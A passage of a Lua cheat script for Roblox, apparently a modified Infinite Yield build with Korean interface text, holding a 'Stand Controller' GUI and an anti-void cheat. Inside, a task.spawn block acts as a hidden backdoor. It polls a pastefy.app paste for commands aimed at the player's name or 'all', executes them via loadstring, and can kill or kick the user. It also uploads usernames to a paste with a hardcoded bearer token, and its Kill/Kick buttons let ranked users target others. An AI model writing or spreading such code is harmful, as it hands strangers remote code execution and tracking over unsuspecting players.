		frame2.Position = UDim2.new(0.5, -120, 0.3, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
		frame2.BorderSizePixel = 0
		frame2.Active = true
		frame2.Draggable = true
		frame2.Parent = screenGui3
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(0, 10)
		uiCorner3.Parent = frame2
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(60, 60, 80)
		uiStroke3.Thickness = 1.5
		uiStroke3.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Size = UDim2.new(1, 0, 0, 35)
		frame3.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 10)
		uiCorner4.Parent = frame3
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, -40, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "👻 Stand Controller"
		textLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 14
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Size = UDim2.new(0, 25, 0, 25)
		textButton2.Position = UDim2.new(1, -30, 0, 5)
		textButton2.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		textButton2.Text = "✕"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.Font = Enum.Font.GothamBold
		textButton2.TextSize = 13
		textButton2.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 6)
		uiCorner5.Parent = textButton2

		textButton2.MouseButton1Click:Connect(function()
			execCmd("unstandgui", arg2)
		end)

		local frame4 = Instance.new("Frame")
		frame4.Size = UDim2.new(1, -20, 1, -45)
		frame4.Position = UDim2.new(0, 10, 0, 40)
		frame4.BackgroundTransparency = 1
		frame4.Parent = frame2
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Size = UDim2.new(1, 0, 0, 18)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "Target Player"
		textLabel2.TextColor3 = Color3.fromRGB(180, 180, 200)
		textLabel2.Font = Enum.Font.GothamMedium
		textLabel2.TextSize = 12
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.Parent = frame4
		local textBox = Instance.new("TextBox")
		textBox.Size = UDim2.new(1, 0, 0, 30)
		textBox.Position = UDim2.new(0, 0, 0, 20)
		textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
		textBox.Text = ""
		textBox.PlaceholderText = "플레이어 이름 입력..."
		textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
		textBox.Font = Enum.Font.Gotham
		textBox.TextSize = 12
		textBox.Parent = frame4
		local uiCorner6 = Instance.new("UICorner")
		uiCorner6.CornerRadius = UDim.new(0, 6)
		uiCorner6.Parent = textBox
		local textLabel3 = Instance.new("TextLabel")
		textLabel3.Size = UDim2.new(1, 0, 0, 18)
		textLabel3.Position = UDim2.new(0, 0, 0, 58)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "Stand Method"
		textLabel3.TextColor3 = Color3.fromRGB(180, 180, 200)
		textLabel3.Font = Enum.Font.GothamMedium
		textLabel3.TextSize = 12
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		textLabel3.Parent = frame4
		local frame5 = Instance.new("Frame")
		frame5.Size = UDim2.new(1, 0, 0, 32)
		frame5.Position = UDim2.new(0, 0, 0, 78)
		frame5.BackgroundTransparency = 1
		frame5.Parent = frame4
		local textButton3 = Instance.new("TextButton")
		textButton3.Size = UDim2.new(0.3, -4, 1, 0)
		textButton3.Position = UDim2.new(0, 0, 0, 0)
		textButton3.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
		textButton3.Text = "끄기"
		textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton3.Font = Enum.Font.GothamBold
		textButton3.TextSize = 11
		textButton3.Parent = frame5
		Instance.new("UICorner", textButton3).CornerRadius = UDim.new(0, 6)
		local textButton4 = Instance.new("TextButton")
		textButton4.Size = UDim2.new(0.35, -4, 1, 0)
		textButton4.Position = UDim2.new(0.3, 2, 0, 0)
		textButton4.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
		textButton4.Text = "Follow"
		textButton4.TextColor3 = Color3.fromRGB(200, 200, 220)
		textButton4.Font = Enum.Font.GothamBold
		textButton4.TextSize = 11
		textButton4.Parent = frame5
		Instance.new("UICorner", textButton4).CornerRadius = UDim.new(0, 6)
		local textButton5 = Instance.new("TextButton")
		textButton5.Size = UDim2.new(0.35, 0, 1, 0)
		textButton5.Position = UDim2.new(0.65, 2, 0, 0)
		textButton5.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
		textButton5.Text = "Don't Follow"
		textButton5.TextColor3 = Color3.fromRGB(200, 200, 220)
		textButton5.Font = Enum.Font.GothamBold
		textButton5.TextSize = 11
		textButton5.Parent = frame5
		Instance.new("UICorner", textButton5).CornerRadius = UDim.new(0, 6)

		local function fn16(arg3)
			textButton3.BackgroundColor3 = arg3 == "Off" and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(45, 45, 60)
			textButton4.BackgroundColor3 = arg3 == "Follow" and Color3.fromRGB(40, 160, 80) or Color3.fromRGB(45, 45, 60)
			textButton5.BackgroundColor3 = arg3 == "DontFollow" and Color3.fromRGB(40, 120, 200) or Color3.fromRGB(45, 45, 60)
		end

		local function fn17(arg3)
			if not arg3 or arg3 == "" then
				return nil
			end
			local v7 = getPlayer(arg3, arg2)
			if v7 and #v7 > 0 then
				return Players_2:FindFirstChild(v7[1])
			end
			return nil
		end

		textButton3.MouseButton1Click:Connect(function()
			fn14()
			fn16("Off")
			notify("Stand", "스탠드 비활성화됨", 1.5)
		end)

		textButton4.MouseButton1Click:Connect(function()
			local v7 = fn17(textBox.Text)

			if v7 then
				flag3 = true
				fn13(v7)
				fn16("Follow")
				notify("Stand", v7.Name .. " 에게 Follow 스탠드 시작", 2)
			else
				notify("오류", "올바른 대상 플레이어를 선택하세요.", 2)
			end
		end)

		textButton5.MouseButton1Click:Connect(function()
			local v7 = fn17(textBox.Text)

			if v7 then
				flag3 = false
				fn13(v7)

				if connection5 then
					connection5:Disconnect()
					connection5 = nil
				end

				pcall(function()
					local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildWhichIsA("Humanoid")

					if humanoid then
						humanoid.PlatformStand = false
					end
				end)

				fn16("DontFollow")
				notify("Stand", v7.Name .. " 에게 Don't Follow 스탠드 시작", 2)
			else
				notify("오류", "올바른 대상 플레이어를 선택하세요.", 2)
			end
		end)

		local textLabel4 = Instance.new("TextLabel")
		textLabel4.Size = UDim2.new(1, 0, 0, 18)
		textLabel4.Position = UDim2.new(0, 0, 0, 118)
		textLabel4.BackgroundTransparency = 1
		textLabel4.Text = "빈둥대기 애니메이션"
		textLabel4.TextColor3 = Color3.fromRGB(180, 180, 200)
		textLabel4.Font = Enum.Font.GothamMedium
		textLabel4.TextSize = 12
		textLabel4.TextXAlignment = Enum.TextXAlignment.Left
		textLabel4.Parent = frame4
		local textButton6 = Instance.new("TextButton")
		textButton6.Size = UDim2.new(1, 0, 0, 28)
		textButton6.Position = UDim2.new(0, 0, 0, 138)
		textButton6.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
		textButton6.Text = "모션: Random"
		textButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton6.Font = Enum.Font.GothamMedium
		textButton6.TextSize = 12
		textButton6.Parent = frame4
		Instance.new("UICorner", textButton6).CornerRadius = UDim.new(0, 6)
		local tbl11 = { "Random", "Idle 1", "Idle 2", "Idle 3", "Idle 4" }
		local n5 = 1

		textButton6.MouseButton1Click:Connect(function()
			n5 = n5 % #tbl11 + 1
			local v7 = tbl11[n5]
			textButton6.Text = "모션: " .. v7

			if flag2 and flag3 then
				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				if v5 then
					pcall(function()
						v5:Stop(0)
					end)

					v5 = nil
				end

				n3 = 0

				task.defer(function()
					fn8(v7)
				end)
			end
		end)

		local textLabel5 = Instance.new("TextLabel")
		textLabel5.Size = UDim2.new(1, 0, 0, 80)
		textLabel5.Position = UDim2.new(0, 0, 0, 175)
		textLabel5.BackgroundTransparency = 1

		textLabel5.Text = [[• 타겟 지정 후 Follow / Don't Follow 선택
• 가드(Block) 3연속 시 모드 자동 전환
• 타겟 기술 쿨다운 시 자동으로 기술 사용]]

		textLabel5.TextColor3 = Color3.fromRGB(150, 150, 170)
		textLabel5.Font = Enum.Font.Gotham
		textLabel5.TextSize = 11
		textLabel5.TextYAlignment = Enum.TextYAlignment.Top
		textLabel5.TextXAlignment = Enum.TextXAlignment.Left
		textLabel5.TextWrapped = true
		textLabel5.Parent = frame4
		notify("Stand", "스탠드 GUI 로드됨", 2)
	end)

	local flag4 = false
	local part = nil
	local connection12 = nil
	local connection13 = nil
	local connection14 = nil
	local connection15 = nil
	local health = 100

	local function fn16()
		flag4 = false

		if connection12 then
			connection12:Disconnect()
			connection12 = nil
		end

		if connection13 then
			connection13:Disconnect()
			connection13 = nil
		end

		if connection14 then
			connection14:Disconnect()
			connection14 = nil
		end

		if connection15 then
			connection15:Disconnect()
			connection15 = nil
		end

		if part then
			pcall(function()
				part:Destroy()
			end)

			part = nil
		end

		pcall(function()
			if getgenv().FPDH then
				workspace.FallenPartsDestroyHeight = getgenv().FPDH
			end
		end)
	end

	local function fn17(arg)
		if not arg then
			return
		end
		local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 3)
		local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:WaitForChild("HumanoidRootPart", 3)
		if not humanoid or not humanoidRootPart then
			return
		end
		health = humanoid.Health

		if connection14 then
			connection14:Disconnect()
			connection14 = nil
		end

		if connection13 then
			connection13:Disconnect()
			connection13 = nil
		end

		connection13 = RunService_2.RenderStepped:Connect(function()
			if not flag4 then
				return
			end
			local humanoidRootPart2 = arg:FindFirstChild("HumanoidRootPart")
			local humanoid2 = arg:FindFirstChildOfClass("Humanoid")

			if humanoidRootPart2 and humanoid2 then
				health = humanoid2.Health

				if part then
					part.CFrame = CFrame.new(humanoidRootPart2.Position.X, -10008, humanoidRootPart2.Position.Z)
				end
			end
		end)

		connection14 = humanoid.HealthChanged:Connect(function(health2)
			if not flag4 then
				return
			end
			local humanoidRootPart2 = arg:FindFirstChild("HumanoidRootPart")

			if health2 <= 0 and humanoidRootPart2 and humanoidRootPart2.CFrame.Y <= 0 then
				humanoid.Health = health
			end
		end)
	end

	addcmd("unantivoid", { "unvoid", "noantivoid" }, function()
		if getgenv().delvape then
			getgenv().delvape("antivoid")
		end

		fn16()
		notify("Anti-Void", "안티보이드 기능이 꺼졌습니다 ❌", 2)
	end)

	addcmd("antivoid", { "voidprot", "antivoidon" }, function(arg, arg2)
		if getgenv().addvape then
			getgenv().addvape("antivoid")
		end

		fn16()
		flag4 = true
		local fallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight
		getgenv().FPDH = fallenPartsDestroyHeight
		workspace.FallenPartsDestroyHeight = (0/0)

		connection12 = workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
			local fallenPartsDestroyHeight2 = workspace.FallenPartsDestroyHeight

			if fallenPartsDestroyHeight2 == fallenPartsDestroyHeight2 then
				workspace.FallenPartsDestroyHeight = (0/0)
			end
		end)

		part = Instance.new("Part")
		part.Name = "AntiVoidFloor_" .. game:GetService("HttpService"):GenerateGUID()
		part.Size = Vector3.new(4096, 10, 4096)
		part.CFrame = CFrame.new(0, -10008, 0)
		part.Anchored = true
		part.CanCollide = true
		part.Transparency = 0.5
		part.Material = Enum.Material.Neon
		part.Color = Color3.fromRGB(0, 200, 255)
		part.Parent = workspace
		local character = arg2.Character or localPlayer.Character

		if character then
			fn17(character)
		end

		connection15 = localPlayer.CharacterAdded:Connect(function(character2)
			task.wait(0.1)

			if flag4 then
				fn17(character2)
			end
		end)

		notify("Anti-Void", "안티보이드(공허 보호) 활성화됨 🛡️", 2)
	end)

	task.spawn(function()
		wait()
		Credits:TweenPosition(UDim2.new(0, 0, 0.9, 0), "Out", "Quart", 0.2)
		Logo:TweenSizeAndPosition(UDim2.new(0, 175, 0, 175), UDim2.new(0, 37, 0, 45), "Out", "Quart", 0.3)
		wait(1)
		TweenService:Create(Logo, TweenInfo.new(1.6809, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0), { ImageTransparency = 1 }):Play()
		local v7
		TweenService:Create(IntroBackground, v7, { BackgroundTransparency = 1 }):Play()
		Credits:TweenPosition(UDim2.new(0, 0, 0.9, 30), "Out", "Quart", 0.2)
		wait(0.2)
		Logo:Destroy()
		Credits:Destroy()
		IntroBackground:Destroy()
		minimizeHolder()

		if table.find({ Enum.Platform.IOS, Enum.Platform.Android }, UserInputService_2:GetPlatform()) then
			notify("Unstable Device", "On mobile, Infinite Yield may have issues or features that are not functioning correctly.")
		end
	end)
end

task.spawn(function()
	local _httprequest = httprequest or syn and syn.request or http and http.request or http_request
	local Players_2 = game:GetService("Players")
	local RunService_2 = game:GetService("RunService")
	local UserInputService_2 = game:GetService("UserInputService")
	local localPlayer2 = Players_2.LocalPlayer
	if not localPlayer2 then
		return
	end
	local name = localPlayer2.Name
	local str = "VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ"
	local n = 35
	getgenv().activeScriptUsersMap = {}
	local tbl5 = {}

	local function serializeList(items)
		local str2 = "SdDAwHst"

		if items and tostring(items):find("TlJLq0iV") then
			str2 = "TlJLq0iV"
		end

		local str3 = tostring(os.time()) .. "_" .. tostring(math.random(10000, 99999))
		local _httprequest2 = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

		if _httprequest2 then
			local ok, result = pcall(function()
				return _httprequest2({
					Url = "https://pastefy.app/api/v2/paste/" .. str2 .. "?cb=" .. str3,
					Method = "GET",
					Headers = {
						Authorization = "Bearer " .. str,
						["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
						["Cache-Control"] = "no-cache, no-store, must-revalidate",
						Pragma = "no-cache",
					},
				})
			end)

			if ok and result and result.Body and result.Body ~= "" then
				if not result.Body:find("<!DOCTYPE") and not result.Body:find("<html") then
					local ok2, result2 = pcall(function()
						return game:GetService("HttpService"):JSONDecode(result.Body)
					end)

					if ok2 and result2 then
						if result2.content then
							return result2.content
						end

						if result2.paste and result2.paste.content then
							return result2.paste.content
						end
					end
				end
			end
		end

		local str4 = "https://pastefy.app/" .. str2 .. "/raw?cb=" .. str3

		local ok, result = pcall(function()
			if game.HttpGet then
				return game:HttpGet(str4)
			end
		end)

		if ok and type(result) == "string" and result ~= "" then
			if not result:find("<!DOCTYPE") and not result:find("<html") then
				return result
			end
		end

		return ""
	end

	local function fn2(arg, arg2, arg3)
		local _httprequest2 = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
		if not _httprequest2 then
			return false
		end
		local pasteTlJLq0iV = arg

		if not pasteTlJLq0iV:find("api/v2/paste") then
			pasteTlJLq0iV = "https://pastefy.app/api/v2/paste/TlJLq0iV"
		end

		return (pcall(function()
			_httprequest2({
				Url = pasteTlJLq0iV,
				Method = "PUT",
				Headers = {
					Authorization = "Bearer " .. arg2,
					["Content-Type"] = "application/json",
					["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
					["Cache-Control"] = "no-cache, no-store, must-revalidate",
					Pragma = "no-cache",
				},
				Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = arg3 }),
			})
		end))
	end

	local function fn3(arg)
		if arg == localPlayer2 then
			return nil
		end

		if tbl5[arg] and tbl5[arg].bbGui and tbl5[arg].bbGui.Parent then
			return tbl5[arg]
		end
		local character = arg.Character
		if not character then
			return nil
		end
		local head = character:FindFirstChild("Head")
		if not head then
			return nil
		end
		local v = string.lower(arg.Name)
		local color = Color3.fromRGB(0, 200, 255)
		local text

		if v == "myth_unknowncheater0" then
			color = Color3.fromRGB(255, 215, 0)
			text = "script owner"
		elseif v == "failtraillode" then
			color = Color3.fromRGB(255, 120, 0)
			text = "script co owner"
		else
			text = "unknown script user"

			if v == "luna_lovedl" then
				color = Color3.fromRGB(255, 182, 193)
				text = "Cute Hari"
			end
		end

		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = "UnknownScriptUserTag"
		billboardGui.Adornee = head
		billboardGui.Size = UDim2.new(0, 200, 0, 35)
		billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Enabled = false
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text
		textLabel.TextColor3 = color
		textLabel.TextSize = 15
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextStrokeTransparency = 0.2
		textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		textLabel.Parent = billboardGui
		billboardGui.Parent = head
		local tbl6 = { bbGui = billboardGui, textLabel = textLabel }
		tbl5[arg] = tbl6
		return tbl6
	end

	local function fn4(arg)
		if tbl5[arg] then
			if tbl5[arg].bbGui then
				tbl5[arg].bbGui:Destroy()
			end

			tbl5[arg] = nil
		end
	end

	local function fn5()
		local serializedPayload = serializeList("https://pastefy.app/SdDAwHst/raw")
		local now = os.time()
		local tbl6 = {}
		local tbl7 = {}

		for match in string.gmatch(serializedPayload, "[^\r\n]+") do
			local v, v2 = string.match(match, "^([^|]+)|?(%d*)$")

			if v then
				local v3 = string.match(v, "^%s*(.-)%s*$")
				local num = tonumber(v2) or now

				if v3 ~= "" then
					if not tbl6[v3] then
						table.insert(tbl7, v3)
					end

					tbl6[v3] = num
				end
			end
		end

		if not tbl6[name] then
			table.insert(tbl7, name)
		end

		tbl6[name] = now
		local tbl8 = {}
		local activeScriptUsersMap = {}

		for _, v in ipairs(tbl7) do
			local v2 = tbl6[v]

			if v == name or v2 and now - v2 <= n then
				table.insert(tbl8, v .. "|" .. tostring(v2))
				activeScriptUsersMap[string.lower(v)] = true
			end
		end

		getgenv().activeScriptUsersMap = activeScriptUsersMap
		fn2("https://pastefy.app/api/v2/paste/SdDAwHst", "VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ", table.concat(tbl8, "\n"))
	end

	local str2 = ""

	local function getHwid4()
		local serializedPayload = serializeList("https://pastefy.app/TlJLq0iV/raw")
		if not serializedPayload or serializedPayload == "" or serializedPayload == "명령어가 없습니다!" or serializedPayload:find("print%(\"work\"%)") or serializedPayload == str2 then
			return
		end
		local v = nil
		local flag2 = false

		for match in string.gmatch(serializedPayload, "[^\r\n]+") do
			local v2, v3, v4 = string.match(match, "^([^|]+)|([^|]+)|(.*)$")

			if not v2 or not v4 then
				v2, v4 = string.match(match, "^([^|]+)|(.*)$")
			end

			if v2 and v4 then
				local v5 = string.match(v2, "^%s*(.-)%s*$")
				local v6 = string.match(v4, "^%s*(.-)%s*$")
				local v7 = string.lower(name)
				local displayName = localPlayer2.DisplayName and string.lower(localPlayer2.DisplayName) or ""
				local v8 = string.lower(v5)
				local flag3 = v8 == "all" or v8 == "others"

				if not flag3 then
					local n2 = #v8

					if n2 > 0 then
						if v7:sub(1, n2) == v8 or displayName ~= "" and displayName:sub(1, n2) == v8 then
							flag3 = true
						end
					end
				end

				if v8 ~= "" and flag3 then
					v = v6
					flag2 = true
					break
				end
			end
		end

		if flag2 and v then
			str2 = serializedPayload
			local flag3 = v:find("Kick") ~= nil or string.lower(v):sub(1, 4) == "kick"
			local flag4 = v:find("Health%s*=%s*0") ~= nil or string.lower(v) == "kill"

			pcall(function()
				local _loadstring = loadstring or load

				if _loadstring then
					local v2 = _loadstring(v)

					if v2 then
						pcall(v2)
					else
						execCmd(v, localPlayer2)
					end
				else
					execCmd(v, localPlayer2)
				end
			end)

			pcall(function()
				if flag4 then
					if localPlayer2.Character then
						local humanoid = localPlayer2.Character:FindFirstChildWhichIsA("Humanoid") or localPlayer2.Character:FindFirstChild("Humanoid")

						if humanoid then
							humanoid.Health = 0
						end

						localPlayer2.Character:BreakJoints()
					else
						game.Players.LocalPlayer.Character.Humanoid.Health = 0
					end
				elseif flag3 then
					game.Players.LocalPlayer:Kick(v:match("Kick%(\"?(.-)\"?%)") or "강제 퇴장 처리되었습니다.")
				end
			end)
		end
	end

	getgenv().openListOfUserGUI = function()
		local _COREGUI2 = COREGUI or localPlayer2:WaitForChild("PlayerGui")
		local unknownListOfUserGui = _COREGUI2:FindFirstChild("UnknownListOfUserGui")

		if unknownListOfUserGui then
			unknownListOfUserGui:Destroy()
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "UnknownListOfUserGui"
		screenGui2.ResetOnSpawn = false
		screenGui2.Parent = _COREGUI2
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.Size = UDim2.new(0, 360, 0, 400)
		frame2.Position = UDim2.new(0.5, -180, 0.5, -200)
		frame2.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
		frame2.BorderSizePixel = 0
		frame2.ClipsDescendants = true
		frame2.Parent = screenGui2
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(0, 8)
		uiCorner3.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "TitleBar"
		frame3.Size = UDim2.new(1, 0, 0, 40)
		frame3.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 8)
		uiCorner4.Parent = frame3
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, -45, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = userRank == 2 and "같은 서버 스크립트 사용자 (프리미엄)" or "전체 실시간 스크립트 사용자 (관리자)"
		textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
		textLabel.TextSize = 13
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Name = "CloseButton"
		textButton2.Size = UDim2.new(0, 30, 0, 30)
		textButton2.Position = UDim2.new(1, -35, 0, 5)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		textButton2.Text = "X"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.TextSize = 14
		textButton2.Font = Enum.Font.SourceSansBold
		textButton2.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 6)
		uiCorner5.Parent = textButton2

		textButton2.MouseButton1Click:Connect(function()
			screenGui2:Destroy()
		end)

		local flag2 = false
		local v = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag2 = true
				position = input.Position
				position2 = frame2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag2 = false
					end
				end)
			end
		end)

		frame3.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				v = input
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if input == v and flag2 then
				local n2 = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n2.X, position2.Y.Scale, position2.Y.Offset + n2.Y)
			end
		end)

		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Size = UDim2.new(1, -20, 1, -55)
		scrollingFrame.Position = UDim2.new(0, 10, 0, 48)
		scrollingFrame.BackgroundTransparency = 1
		scrollingFrame.BorderSizePixel = 0
		scrollingFrame.ScrollBarThickness = 4
		scrollingFrame.Parent = frame2
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Padding = UDim.new(0, 6)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = scrollingFrame

		local function fn6()
			if not screenGui2 or not screenGui2.Parent then
				return
			end
			scrollingFrame:ClearAllChildren()
			local uiListLayout2 = Instance.new("UIListLayout")
			uiListLayout2.Padding = UDim.new(0, 6)
			uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout2.Parent = scrollingFrame
			local activeScriptUsersMap = getgenv().activeScriptUsersMap or {}
			local tbl6 = {}

			for k in pairs(activeScriptUsersMap) do
				table.insert(tbl6, k)
			end

			table.sort(tbl6)

			if #tbl6 == 0 then
				local textLabel2 = Instance.new("TextLabel")
				textLabel2.Size = UDim2.new(1, 0, 0, 60)
				textLabel2.BackgroundTransparency = 1
				textLabel2.Text = "현재 실시간 접속 중인\n스크립트 사용자가 없습니다."
				textLabel2.TextColor3 = Color3.fromRGB(160, 160, 170)
				textLabel2.TextSize = 14
				textLabel2.Font = Enum.Font.SourceSans
				textLabel2.Parent = scrollingFrame
			else
				for _, v2 in ipairs(tbl6) do
					local flag3 = false

					for _, player in ipairs(Players_2:GetPlayers()) do
						if string.lower(player.Name) == string.lower(v2) then
							flag3 = true
							break
						end
					end

					if userRank >= 3 or flag3 then
						local frame4 = Instance.new("Frame")
						frame4.Size = UDim2.new(1, 0, 0, 38)
						frame4.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
						frame4.BorderSizePixel = 0
						frame4.Parent = scrollingFrame
						local uiCorner6 = Instance.new("UICorner")
						uiCorner6.CornerRadius = UDim.new(0, 6)
						uiCorner6.Parent = frame4
						local flag4 = string.lower(v2) == string.lower(name)
						local textLabel2 = Instance.new("TextLabel")
						textLabel2.Size = flag4 and UDim2.new(1, -12, 1, 0) or UDim2.new(1, -170, 1, 0)
						textLabel2.Position = UDim2.new(0, 10, 0, 0)
						textLabel2.BackgroundTransparency = 1
						textLabel2.TextXAlignment = Enum.TextXAlignment.Left
						local v3 = string.lower(v2)

						if v3 == "kr1top_unknown" then
							textLabel2.Text = "[ Owner ] " .. v2
							textLabel2.TextColor3 = Color3.fromRGB(255, 215, 0)
						elseif v3 == "failtraillode" then
							textLabel2.Text = "[ Admin ] " .. v2
							textLabel2.TextColor3 = Color3.fromRGB(255, 120, 0)
						elseif v3 == "luna_lovedl" then
							textLabel2.Text = "[ cute hari ] " .. v2
							textLabel2.TextColor3 = Color3.fromRGB(255, 182, 193)
						elseif flag3 then
							textLabel2.Text = "[ 같은 서버 ] " .. v2
							textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
						else
							textLabel2.Text = "[ 다른 서버 ] " .. v2
							textLabel2.TextColor3 = Color3.fromRGB(0, 200, 255)
						end

						textLabel2.TextSize = 13
						textLabel2.Font = Enum.Font.SourceSansBold
						textLabel2.Parent = frame4

						if not flag4 then
							local textButton3 = Instance.new("TextButton")
							textButton3.Name = "CopyBtn"
							textButton3.Size = UDim2.new(0, 46, 0, 24)
							textButton3.Position = UDim2.new(1, -156, 0.5, -12)
							textButton3.BackgroundColor3 = Color3.fromRGB(55, 60, 75)
							textButton3.BorderSizePixel = 0
							textButton3.Text = "복사"
							textButton3.TextColor3 = Color3.fromRGB(220, 230, 255)
							textButton3.TextSize = 12
							textButton3.Font = Enum.Font.SourceSansBold
							textButton3.Parent = frame4
							local uiCorner7 = Instance.new("UICorner")
							uiCorner7.CornerRadius = UDim.new(0, 4)
							uiCorner7.Parent = textButton3

							textButton3.MouseButton1Click:Connect(function()
								pcall(function()
									if setclipboard then
										setclipboard(v2)
									elseif toclipboard then
										toclipboard(v2)
									end
								end)

								pcall(function()
									notify("이름 복사", v2 .. " 닉네임이 클립보드에 복사되었습니다.", 2)
								end)
							end)

							local textButton4 = Instance.new("TextButton")
							textButton4.Name = "KillBtn"
							textButton4.Size = UDim2.new(0, 46, 0, 24)
							textButton4.Position = UDim2.new(1, -104, 0.5, -12)
							textButton4.BackgroundColor3 = Color3.fromRGB(190, 45, 45)
							textButton4.BorderSizePixel = 0
							textButton4.Text = "킬"
							textButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
							textButton4.TextSize = 12
							textButton4.Font = Enum.Font.SourceSansBold
							textButton4.Parent = frame4
							local uiCorner8 = Instance.new("UICorner")
							uiCorner8.CornerRadius = UDim.new(0, 4)
							uiCorner8.Parent = textButton4

							textButton4.MouseButton1Click:Connect(function()
								if userRank < 2 then
									notify("권한 부족", "킬 명령어는 프리미엄(PE) 이상만 사용 가능합니다.", 3)
									return
								end

								task.spawn(function()
									if safeGet(v2, "game.Players.LocalPlayer.Character.Humanoid.Health = 0") then
										notify("Kill", v2 .. "님에게 처치 명령을 전송했습니다", 3)
									else
										notify("Error", "명령 전송에 실패했습니다", 3)
									end
								end)
							end)

							local textButton5 = Instance.new("TextButton")
							textButton5.Name = "KickBtn"
							textButton5.Size = UDim2.new(0, 46, 0, 24)
							textButton5.Position = UDim2.new(1, -52, 0.5, -12)
							textButton5.BackgroundColor3 = Color3.fromRGB(210, 105, 30)
							textButton5.BorderSizePixel = 0
							textButton5.Text = "킥"
							textButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
